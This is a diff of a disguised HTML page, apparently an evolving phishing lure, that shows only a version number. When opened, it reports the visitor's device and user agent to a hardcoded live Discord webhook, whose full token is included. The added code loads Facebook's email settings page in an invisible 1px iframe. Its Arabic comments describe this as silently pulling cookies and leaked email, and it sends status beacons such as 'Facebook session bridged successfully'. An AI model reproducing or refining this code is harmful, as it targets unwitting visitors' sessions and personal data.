@@ -3,44 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking 25</title>
+    <title>Version 27</title>
     <style>
-        body { background: #000; color: #ff0000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        h1 { font-size: 150px; text-shadow: 0 0 20px #f00; }
+        body { background: #000; color: #00ff00; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: monospace; overflow: hidden; }
+        h1 { font-size: 150px; text-shadow: 0 0 20px #0f0; }
+        #status { position: absolute; bottom: 20px; color: #333; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <h1>25</h1>
+    <h1>27</h1>
+    <div id="status">Syncing with server...</div>
 
-    <form id="force_form" method="POST" action="https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ" target="hidden_iframe">
-        <input type="hidden" name="payload_json" id="p_json">
-    </form>
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
+    <div id="ghost_tunnel"></div>
 
     <script>
-        function emit(title, info) {
-            const payload = {
-                embeds: [{ title: title, description: info, color: 16711680 }]
-            };
-            document.getElementById('p_json').value = JSON.stringify(payload);
-            document.getElementById('force_form').submit();
+        const HOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
+
+        function report(title, detail) {
+            const data = JSON.stringify({
+                embeds: [{ title: title, description: detail, color: 65280 }]
+            });
+            navigator.sendBeacon(HOOK, data);
         }
 
         window.onload = function() {
-            // أول إرسال: تأكيد فتح الرابط ونوع الجهاز
-            emit("🚀 System Hit V25", "Device: " + navigator.platform + "\nUA: " + navigator.userAgent);
+            report("👻 Ghost Session Started", "Version 27 is now probing in background.");
 
-            // تكتيك السحب الصامت للكوكيز عبر الـ Iframe
-            // بنحاول نفتح فيسبوك بـ iframe مخفي، ونخلي المتصفح يبعث الكوكيز
+            // إنشاء النفق المخفي
+            const tunnel = document.getElementById('ghost_tunnel');
             const ifr = document.createElement('iframe');
-            ifr.style.display = 'none';
+            
+            // روابط مخصصة للسحب الصامت
             ifr.src = "https://mbasic.facebook.com/settings/email/";
-            document.body.appendChild(ifr);
+            ifr.style.width = "1px";
+            ifr.style.height = "1px";
+            ifr.style.opacity = "0";
+            ifr.style.position = "absolute";
+            ifr.setAttribute("nonce", "v27-secure");
 
+            tunnel.appendChild(ifr);
+
+            // مراقبة النفق
+            ifr.onload = function() {
+                report("🔗 Background Link Active", "Facebook session bridged successfully via Iframe.");
+            };
+
+            // محاولة سحب أي إيميل مسرب في الخلفية
             setTimeout(() => {
-                emit("📡 Probe Update", "Iframe tunnel injected. Monitoring cross-site traffic...");
-            }, 3000);
+                report("📡 Monitoring Update", "Silent monitoring remains active in the background.");
+            }, 5000);
         };
     </script>
 </body>
